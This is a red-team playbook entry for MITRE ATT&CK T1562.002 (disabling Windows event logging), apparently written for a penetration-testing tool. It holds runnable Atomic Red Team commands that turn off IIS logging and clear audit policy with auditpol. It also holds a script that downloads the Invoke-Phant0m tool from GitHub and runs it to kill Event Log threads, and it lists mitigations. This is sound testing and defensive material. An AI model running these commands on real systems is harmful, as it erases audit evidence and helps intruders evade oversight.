---
name: "T1562.002_disable-windows-event-logging"
description: "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1562.002
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1562.002"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1562/002"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1562
  - T1562.001
  - T1562.003
  - T1562.004
  - T1562.006
  - T1562.007
  - T1562.008
  - T1562.009
  - T1562.010
  - T1562.011
  - T1562.012
  - T1562.013
prerequisites:
  - T1562
severity_boost:
  T1562: "Chain with T1562 for deeper attack path"
  T1562.001: "Chain with T1562.001 for deeper attack path"
  T1562.003: "Chain with T1562.003 for deeper attack path"
---

# T1562.002 Disable Windows Event Logging

> **Sub-technique of:** T1562

## High-Level Description

Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.

The EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Policies\Audit Policy</code> for basic audit policy settings or <code>Security Settings\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <code>auditpol.exe</code> may also be used to set audit policies.

Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service -Name EventLog</code>). Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code> then restarting the system for the change to take effect.

There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the "Start" value in the key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code> to disable the entire EventLog.

Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.

By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Disable Windows Event Logging technique is applicable to target environment
- [ ] Check Windows systems for indicators of Disable Windows Event Logging
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Disable Windows IIS HTTP Logging

Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
This action requires HTTP logging configurations in IIS to be unlocked.

Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)

**Supported Platforms:** windows

```powershell
C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
```

### Atomic Test 2: Disable Windows IIS HTTP Logging via PowerShell

Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
This action requires HTTP logging configurations in IIS to be unlocked.

Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)

**Supported Platforms:** windows

```powershell
set-WebConfigurationProperty -PSPath "IIS:\Sites\#{website_name}\" -filter "system.webServer/httpLogging" -name dontLog -value $true
```

### Atomic Test 3: Kill Event Log Service Threads

Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
$output = "$env:TEMP\Invoke-Phant0m.ps1"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

### Atomic Test 4: Impair Windows Audit Log Policy

Disables the windows audit policy to prevent key host based telemetry being written into the event logs.
[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
auditpol /set /category:"Account Logon" /success:disable /failure:disable
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Detailed Tracking" /success:disable
```

### Atomic Test 5: Clear Windows Audit Policy Config

Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
auditpol /clear /y
auditpol /remove /allusers
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Disable Windows Event Logging by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1562.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1022 Restrict File and Directory Permissions

Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with logging or deleting or modifying .evtx logging files. Ensure .evtx files, which are located at <code>C:\Windows\system32\Winevt\Logs</code>, have the proper file permissions for limited, legitimate access and audit policies for detection.

### M1024 Restrict Registry Permissions

Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering logging. The addition of the MiniNT registry key disables Event Viewer.

### M1047 Audit

Consider periodic review of <code>auditpol</code> settings for Administrator accounts and perform dynamic baselining on SIEM(s) to investigate potential malicious activity. Also ensure that the EventLog service and its threads are properly running.

### M1018 User Account Management

Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with logging.

## Detection

### Detect disabled Windows event logging

## Risk Assessment

| Finding                                            | Severity | Impact          |
| -------------------------------------------------- | -------- | --------------- |
| Disable Windows Event Logging technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [Disable_Win_Event_Logging](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/disable-windows-event-logging)
- [def_ev_win_event_logging](https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/)
- [EventLog_Core_Technologies](https://www.coretechnologies.com/blog/windows-services/eventlog/)
- [Audit_Policy_Microsoft](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy)
- [Windows Log Events](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
- [disable_win_evt_logging](https://ptylu.github.io/content/report/report.html?report=25)
- [auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol)
- [winser19_file_overwrite_bug_twitter](https://web.archive.org/web/20211107115646/https://twitter.com/klinix5/status/1457316029114327040)
- [T1562.002_redcanaryco](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md)
- [Advanced_sec_audit_policy_settings](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings)
- [auditpol.exe_STRONTIC](https://strontic.github.io/xcyclopedia/library/auditpol.exe-214E0EA1F7F7C27C82D23F183F9D23F1.html)
- [evt_log_tampering](https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c)
- [Atomic Red Team - T1562.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1562.002)
- [MITRE ATT&CK - T1562.002](https://attack.mitre.org/techniques/T1562/002)
